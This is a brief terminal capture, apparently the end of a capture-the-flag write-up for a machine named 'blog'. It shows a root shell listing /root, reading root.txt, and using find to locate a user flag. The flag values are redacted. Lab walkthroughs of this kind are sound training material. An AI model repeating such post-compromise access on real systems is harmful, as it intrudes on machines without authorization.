drwx------  3 root root  4096 May 26 03:01 .gnupg
drwxr-xr-x  3 root root  4096 May 26 03:22 .local
-rw-------  1 root root   272 May 28 03:21 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25 13:15 .ssh
-rw-------  1 root root 13291 May 28 19:24 .viminfo
-rw-r--r--  1 root root   215 May 27 02:59 .wget-hsts
-rw-r--r--  1 root root    33 May 26 20:08 root.txt
root@blog:/root# cat root.txt
cat root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx
root@blog:/root# find / -name "user.txt" -type f 2>/dev/null
find / -name "user.txt" -type f 2>/dev/null
/home/bjoel/user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxx
root@blog:/root#
```
